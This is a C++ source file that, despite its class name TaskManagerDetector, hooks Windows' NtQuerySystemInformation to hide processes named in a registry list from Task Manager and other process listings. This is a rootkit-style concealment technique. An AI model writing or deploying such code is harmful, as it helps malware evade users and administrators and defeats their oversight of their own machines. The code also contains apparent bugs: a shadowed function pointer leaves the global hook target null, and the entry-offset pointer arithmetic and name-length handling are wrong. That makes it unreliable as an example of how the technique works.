#include "stdafx.h"
#include "TaskManagerDetector.h"
#include "Utils.h"
#include "LogWriter.h"

std::unique_ptr<TaskManagerDetector> TaskManagerDetector::m_instance(nullptr);

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(__stdcall * CurNtQuerySystemInformation)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL);

CurNtQuerySystemInformation trueNtQuerySystemInformation = nullptr;

std::unique_ptr<TaskManagerDetector> & TaskManagerDetector::GetInstance()
{
    if (m_instance.get() == nullptr)
    {
        m_instance.reset(new TaskManagerDetector);
    }
    return m_instance;
}

bool TaskManagerDetector::InstallHooks()
{
    CurNtQuerySystemInformation trueNtQuerySystemInformation = (CurNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!trueNtQuerySystemInformation || Mhook_SetHook((PVOID *)&trueNtQuerySystemInformation, &TaskManagerDetector::TimedNtQuerySystemInformation))
    {
        return false;
    }
    LOG_PRINT(L"NtQuerySystemInformation successfuly hooked");
    return true;
}

NTSTATUS TaskManagerDetector::TimedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = trueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
    PMY_SYSTEM_PROCESS_INFORMATION pNext = NULL;
    bool findProcess = false;
    std::vector<std::wstring> processList;
    std::vector<PMY_SYSTEM_PROCESS_INFORMATION> newSystemInformation;

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
    {
        if (!LoadMultiString(CONFIG_REGISTRY_PROCESS_HIDE, processList))
        {
            return status;
        }
        pCurrent = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>(SystemInformation);
        std::wstring imageName;
        while (pCurrent != 0)
        {
            pNext = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>((reinterpret_cast<PUCHAR>(pCurrent + pCurrent->NextEntryOffset)));
            imageName = std::wstring(pCurrent->ImageName.Buffer, pCurrent->ImageName.Length);
            for (const auto & processName : processList)
            {
                if (toLowerW(processName).compare(toLowerW(imageName)) == 0)
                {
                    findProcess = true;
                    break;
                }
            }
            if (findProcess)
            {
                pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                findProcess = false;
            }
            pCurrent = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>((reinterpret_cast<PUCHAR>(pCurrent + pCurrent->NextEntryOffset)));
        }
    }

    return status;
}
